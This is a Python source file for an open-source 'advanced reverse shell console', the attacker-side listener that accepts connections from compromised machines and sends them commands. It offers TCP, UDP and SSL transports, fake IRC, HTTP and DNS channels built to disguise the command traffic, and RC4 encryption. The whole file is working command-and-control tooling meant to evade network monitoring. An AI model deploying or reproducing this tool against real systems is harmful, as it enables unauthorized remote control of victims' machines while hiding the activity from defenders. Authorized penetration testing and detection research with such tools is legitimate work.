#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.3"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = [
    "ReverseShell",
    "IrcReverseShell",
    "DnsReverseShell",
    "HttpReverseShell",
    "ReverseShellUdp",
    "ReverseShellTcp",
    "ReverseShellSocketTcp",
    "main",
]

print(copyright)

from cmd import Cmd
from sys import exit
from socket import socket
from os import urandom, name
from functools import partial
from contextlib import suppress
from random import randint, choices
from collections.abc import Callable
from shlex import split as shellsplit
from json import JSONDecodeError, loads
from string import ascii_letters, digits
from typing import TypeVar, List, Dict, Tuple
from argparse import ArgumentParser, Namespace
from base64 import b64encode, b64decode, b16decode, b16encode
from ssl import SSLContext, PROTOCOL_TLS_SERVER, SSLWantReadError
from socketserver import BaseRequestHandler, UDPServer, TCPServer

from PythonToolsKit.Encodings import decode_data

Json = TypeVar("Json", dict, list, str, int, float, bool)
alphanum: bytes = ascii_letters.encode() + b"_" + digits.encode()
letters: bytes = ascii_letters.encode()


class ReverseShell(Cmd, BaseRequestHandler):

    """
    This class implements a reverse shell command line.

    key: if is not None decrypt received data and encrypt
    data to send with the key.
    """

    prompt: str = "~$ "
    _set: bool = False
    color: bool = True

    def __init__(
        self,
        *args,
        key: bytes = None,
        encoding: str = "utf-8" if name != "nt" else "cp437",
    ):
        self.encoding = encoding
        self.files: List[str] = []
        self.executables: List[str] = []
        self.key = key and self.init_key(key)
        Cmd.__init__(self)
        BaseRequestHandler.__init__(self, *args)

    def recv(self) -> bytes:
        """
        This method gets all packets sent.
        """

        data = self.sock.recv(65535)
        self.sock.setblocking(False)
        while True:
            try:
                data += self.sock.recv(65535)
            except (BlockingIOError, SSLWantReadError):
                break

        self.sock.setblocking(True)
        return data

    def handle(self) -> None:
        """
        This methods gets TCP data and send it.
        """

        request = self.request
        if isinstance(request, tuple):
            sock = self.sock = request[1]
            data = request[0]
            self.sender = lambda x: sock.sendto(x, self.client_address)
        else:
            sock = self.sock = request
            data = self.recv()
            self.sender = self.request.sendall

        data = self.parse_data(data)

        if data:
            print(data)
            self.cmdloop()

    def defined_context(self, data: Dict[str, Json]) -> None:
        """
        This function sets context.
        """

        self.hostname = hostname = data.get("hostname", self.client_address[0])
        self.user = user = data.get("user", "user")
        self.current_directory = cwd = data.get("cwd", "~")
        ReverseShell.prompt = (
            (
                "\x1b[48;2;50;50;50m"
                f"\x1b[38;2;37;161;127m{hostname}\x1b[39m@"
                f"\x1b[38;2;47;99;161m{user}\x1b[39m:"
                f"\x1b[38;2;246;172;56m{cwd}\x1b[39m$ "
            )
            if self.color
            else f"{hostname}@{user}:{cwd}$ "
        )
        self.executables = data.get("executables", [])
        self.files = data.get("files", [])
        ReverseShell._set = True

    def parse_data(self, data: bytes) -> str:
        """
        This function parses TCP data.
        """

        if self.key:
            data = self.encrypt(data, decrypt=True)

        if data[0] == 1:
            try:
                data = loads(data[1:])
            except JSONDecodeError:
                pass
            else:
                self.defined_context(data)
                self.default("\x06")
                return b""

        if not self._set:
            self.prompt = self.client_address[0] + "~$ "

        try:
            return data.decode(self.encoding)
        except UnicodeDecodeError:
            return decode_data(data)

    def completenames(
        self, text: str, line: str, begidx: int, endidx: int
    ) -> List[str]:
        """
        This function returns the default list for completion.
        """

        startfilename = shellsplit(line)[-1]
        return [
            x
            for x in self.executables
            + self.files
            + ["./" + file for file in self.files]
            if x.startswith(startfilename)
        ]

    completedefault = completenames

    def default(self, arg: str) -> None:
        """
        This method sends data to socket shell client.
        """

        if self.key:
            data = self.encrypt(arg.encode(self.encoding))
        else:
            data = arg.encode(self.encoding)

        self.sender(data)

    def postcmd(self, stop: bool, line: str) -> bool:
        """
        This function stop the cmdloop for each packet sended.
        """

        if line.strip():
            return True
        else:
            return False

    def do_quit(self, arg: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return True

    def do_exit(self, arg: str) -> bool:
        """
        This method exits the reverse shell.
        """

        return True

    def init_key(self, key_text: bytes) -> bytes:
        """
        This method sets RC4 key.
        """

        key = self.key = bytearray(range(256))
        j = 0

        for i in range(256):
            j = (j + key[i] + key_text[i % len(key_text)]) % 256
            key[i], key[j] = key[j], key[i]

        return key

    def encrypt(self, data: bytes, decrypt: bool = False) -> bytes:
        """
        This method encrypts/decrypts data with RC4.
        """

        if decrypt:
            iv = data[:256]
            data = data[256:]
        else:
            iv = urandom(256)

        i = j = 0
        encrypted = bytearray()
        key = [iv[i] ^ char for i, char in enumerate(self.key)]

        for char in data:
            i = (i + 1) % 256
            j = (j + key[i]) % 256
            key[i], key[j] = key[j], key[i]
            encrypted.append(char ^ key[(key[i] + key[j]) % 256])

        if decrypt:
            return bytes(encrypted)
        return iv + bytes(encrypted)


class IrcReverseShell(ReverseShell):

    """
    This class implements a fake IRC server for a reverse shell.
    """

    @staticmethod
    def random_message() -> bytes:
        """
        This method generates a random message.
        """

        msg = b""
        for a in range(randint(2, 8)):
            msg += bytes(choices(letters, k=randint(1, 10))) + b" "
        return msg[:-1]

    def parse_data_step0(self, data: bytes) -> str:
        """
        This method parses the USER IRC command (first packet
        for IRC initialization).
        """

        def random_domain() -> bytes:
            return (
                b"*"  # wildcard syntax for subdomain
                + b"."
                + bytes(choices(alphanum, k=randint(1, 10)))
                + b"."
                + bytes(choices(letters, k=randint(1, 10)))
            )

        if len(data) > 5 and data.startswith(b"USER "):
            splitted_data = data.split(maxsplit=4)
            if len(splitted_data) == 5:
                (
                    _,
                    self.user,
                    self.hostname,
                    self.servername,
                    self.description,
                ) = splitted_data
                self.user = self.user.decode()
                self.hostname = self.hostname.decode()
                self.description = self.description.strip().decode()
                ReverseShell.prompt = (
                    f"{self.hostname}@{self.user}{self.description}$ "
                )
                self.random_domain = random_domain()
                self.__class__.parse_data = self.parse_data_step1
                self.sender(
                    b":"
                    + self.random_domain
                    + b" NOTICE * :"
                    + self.random_message()
                    + b"\r\n"
                )

        return ""

    def parse_data_step1(self, data: bytes) -> str:
        """
        This method parses the NICK IRC command (second packet
        for IRC initialization).
        """

        if len(data) > 5 and data.startswith(b"NICK "):
            self.nickname = data[5:].strip()
            self.__class__.parse_data = self.parse_data_step2
            self.sender(
                b":"
                + self.random_domain
                + b" NOTICE * :"
                + self.random_message()
                + b"\r\n"
            )
            return ""

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def parse_data_step2(self, data: bytes) -> str:
        """
        This method parses the JOIN IRC command (third packet
        for IRC initialization).
        """

        if len(data) > 6 and data.startswith(b"JOIN #"):
            channels = data[5:].strip()
            self.__class__.channels = channels.split(b",")
            self.sender(b":" + self.nickname + b" JOIN :" + channels + b"\r\n")
            self.ping = bytes(choices(alphanum, k=randint(1, 10)))
            self.__class__.parse_data = self.parse_data_step3
            self.sender(b"PING :" + self.ping + b"\r\n")
            return ""

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def parse_data_step3(self, data: bytes) -> str:
        """
        This method parses the JOIN IRC command (third packet
        for IRC initialization).
        """

        if data.startswith(b"PONG :"):
            if self.ping == data[6:].strip():
                self.__class__.parse_data = self.parse_data_step4
                self.sender(
                    b":"
                    + self.random_domain
                    + b" NOTICE "
                    + self.nickname
                    + b" :"
                    + self.random_message()
                    + b"\r\n"
                )
                return ""

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def parse_data_step4(self, data: bytes) -> str:
        """
        This method parses the PRIVMSG IRC packets used for reverse shell.
        """

        if len(data) > 9 and data.startswith(b"PRIVMSG #"):
            splitted_data = data.split()
            if len(splitted_data) == 3 and splitted_data[1] in self.channels:
                return super().parse_data(b64decode(splitted_data[2][1:]))

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def default(self, data: str) -> None:
        """
        This method generates IRC response.
        """

        self.username = getattr(self, "username", None) or bytes(
            choices(alphanum, k=randint(4, 10))
        )
        sender = self.sender
        self.sender = lambda x: sender(
            b":"
            + self.username
            + b" PRIVMSG "
            + self.channels[0]
            + b" :"
            + b64encode(x)
            + b"\r\n"
        )
        super().default(data)

    parse_data = parse_data_step0


class DnsReverseShell(ReverseShell):

    """
    This class implements a reverse shell using DNS (UDP).
    """

    def parse_data(self, data: bytes) -> str:
        """
        This method parses DNS requests.
        """

        self.dns_id = data[:2]
        query = data[12:].split(b"\x00")[0]
        data = bytearray()

        while query:
            length = query[0] + 1
            data += b16decode(query[1:length])
            query = query[length:]

        return super().parse_data(data)

    def default(self, data: str) -> None:
        """
        This method generates HTTP response.
        """

        def generate_query(data: bytes) -> bytes:
            first = data[:5]
            query = bytearray()
            query.append(len(first) * 2)
            query += b16encode(first)
            data = data[5:]
            while len(data) > 50:
                length = randint(10, 50)
                query += (length * 2).to_bytes(1) + b16encode(data[:length])
                data = data[length:]
            if data:
                query += (len(data) * 2).to_bytes(
                    1, byteorder="big"
                ) + b16encode(data)
            query += (
                b"\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01"
                + randint(0, 2147483647).to_bytes(4, "big")
                + b"\x00\x04"
                + randint(0, 2147483647).to_bytes(4, "big")
            )
            return query

        sender = self.sender
        self.sender = lambda x: sender(
            self.dns_id
            + b"\x80\x00\x00\x01\x00\x01\x00\x00\x00\x00"
            + generate_query(x)
        )
        super().default(data)


class HttpReverseShell(ReverseShell):

    """
    This class implements a reverse shell using HTTP.
    """

    def parse_data(self, data: bytes) -> str:
        """
        This method parses HTTP requests.
        """

        return super().parse_data(data.split(b"\r\n\r\n", 1)[1])

    def default(self, data: str) -> None:
        """
        This method generates HTTP response.
        """

        sender = self.sender
        self.sender = lambda x: sender(
            b"HTTP/1.0 200 OK\r\nContent-Type: {type}\r\n".replace(
                b"{type}",
                b"octect/stream" if self.key else b"text/plain; charset=utf-8",
            )
            + b"Content-Length: {length}\r\n\r\n".replace(
                b"{length}", str(len(x)).encode()
            )
            + x
        )
        super().default(data)


class ReverseShellTcp(TCPServer):

    """
    This class implements TCP server with ssl.
    """

    def __init__(
        self,
        address: Tuple[str, int] = ("0.0.0.0", 1337),
        handler: type = ReverseShell,
        ssl: bool = False,
        cert: str = "server.crt",
        key: str = "server.key",
    ):
        super().__init__(address, handler)
        self.certfile = cert
        self.keyfile = key
        self.ssl = ssl

    def get_request(self):
        """
        This method sets SSL encryption for new connection.
        """

        socket, address = super().get_request()
        if self.ssl:
            context = SSLContext(PROTOCOL_TLS_SERVER)
            context.load_cert_chain(self.certfile, self.keyfile)
            socket = context.wrap_socket(
                socket,
                server_side=True,
            )

        return socket, address


class ReverseShellSocketTcp:

    """
    This class implements a one-socket TCP server.
    """

    def __init__(
        self,
        address: Tuple[str, int] = ("0.0.0.0", 1337),
        handler: type = ReverseShell,
        ssl: bool = False,
        cert: str = "server.crt",
        key: str = "server.key",
    ):
        self.server_address = address
        self.handler = handler
        self.certfile = cert
        self.keyfile = key
        self.ssl = ssl

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.run = False
        self.request.close()

    def serve_forever(self):
        """
        This method starts the socket of the reverse shell server.
        """

        sock = self.request = socket()
        sock.bind(self.server_address)
        sock.listen(1)
        request, client_address = sock.accept()
        self.run = True

        if self.ssl:
            context = SSLContext(PROTOCOL_TLS_SERVER)
            context.load_cert_chain(self.certfile, self.keyfile)
            request = context.wrap_socket(
                request,
                server_side=True,
                certfile=self.certfile,
                keyfile=self.keyfile,
            )

        while self.run:
            self.handler(request, client_address, self)


class ReverseShellUdp(UDPServer):

    """
    This class implements UDP server.
    """

    def __init__(
        self,
        address: Tuple[str, int] = ("0.0.0.0", 1337),
        handler: type = ReverseShell,
    ):
        super().__init__(address, handler)


def parser() -> Namespace:
    """
    This function parses command line arguments.
    """

    arguments = ArgumentParser(
        description="Advanced reverse shell console."
    )
    protocol = arguments.add_mutually_exclusive_group()
    arguments_add_argument = arguments.add_argument
    protocol_add_argument = protocol.add_argument
    protocol_add_argument(
        "--udp", "-u", action="store_true", help="Use UDP socket."
    )
    protocol_add_argument(
        "--tcp", "-t", action="store_true", help="Use TCP socket."
    )
    protocol_add_argument(
        "--multi-tcp",
        "-T",
        action="store_true",
        help="Create TCP socket for each command and responses.",
    )
    protocol = arguments.add_mutually_exclusive_group()
    protocol_add_argument = protocol.add_argument
    protocol_add_argument(
        "--http",
        "-H",
        action="store_true",
        help="Use HTTP requests and responses.",
    )
    protocol_add_argument(
        "--dns",
        "-d",
        action="store_true",
        help="Use DNS requests and responses.",
    )
    protocol_add_argument(
        "--irc",
        "-I",
        action="store_true",
        help="Use IRC requests and response.",
    )
    arguments_add_argument(
        "--no-color",
        "--color",
        "-C",
        default=True,
        action="store_false",
        help="Do not use color",
    )
    arguments_add_argument(
        "--key",
        "-k",
        default=None,
        type=lambda x: bytes(x, "utf-8"),
        help="Add a key to encrypt with RC4.",
    )
    arguments_add_argument(
        "--cert", "-c", default="server.crt", help="SSL cert file."
    )
    arguments_add_argument(
        "--private", "-P", default="server.key", help="SSL private key file."
    )
    arguments_add_argument(
        "--ip",
        "-i",
        default="0.0.0.0",
        help="IP address to start the ReverseShell server.",
    )
    arguments_add_argument(
        "--port",
        "-p",
        default=1337,
        help="UDP/TCP port to start the ReverseShell server.",
    )
    arguments_add_argument(
        "--encoding",
        "-e",
        default="utf-8" if name != "nt" else "cp437",
        help="The reverse shell encoding used by client.",
    )
    arguments_add_argument(
        "--ssl", "-s", action="store_true", help="Use SSL over TCP socket."
    )
    return arguments.parse_args()


def main() -> int:
    """
    This function starts the ReverseShell
    from command line and returns the exit code.
    """

    arguments = parser()

    ReverseShell.color = arguments.no_color

    if arguments.udp:
        class_: Callable = partial(
            ReverseShellUdp, address=(arguments.ip, arguments.port)
        )
        protocol = "udp"
    elif arguments.multi_tcp:
        class_: Callable = partial(
            ReverseShellTcp,
            address=(arguments.ip, arguments.port),
            ssl=arguments.ssl,
            cert=arguments.cert,
            key=arguments.private,
        )
        protocol = "tcp"
    else:
        class_: Callable = partial(
            ReverseShellSocketTcp,
            address=(arguments.ip, arguments.port),
            ssl=arguments.ssl,
            cert=arguments.cert,
            key=arguments.private,
        )
        protocol = "tcp-onesocket"

    if arguments.http:
        handler: Callable = partial(
            HttpReverseShell, key=arguments.key, encoding=arguments.encoding
        )
        protocol += " http"
    elif arguments.irc:
        handler: Callable = partial(
            IrcReverseShell, key=arguments.key, encoding=arguments.encoding
        )
        protocol += " irc"
    elif arguments.dns:
        handler: Callable = partial(
            DnsReverseShell, key=arguments.key, encoding=arguments.encoding
        )
        protocol += " dns"
    else:
        handler: Callable = partial(
            ReverseShell, key=arguments.key, encoding=arguments.encoding
        )

    with class_(handler=handler) as shellserver:
        print(
            protocol,
            "://",
            shellserver.server_address[0],
            ":",
            shellserver.server_address[1],
            sep="",
        )
        with suppress(KeyboardInterrupt):
            shellserver.serve_forever()

    if arguments.no_color:
        print("\x1b[0m")


if __name__ == "__main__":
    exit(main())
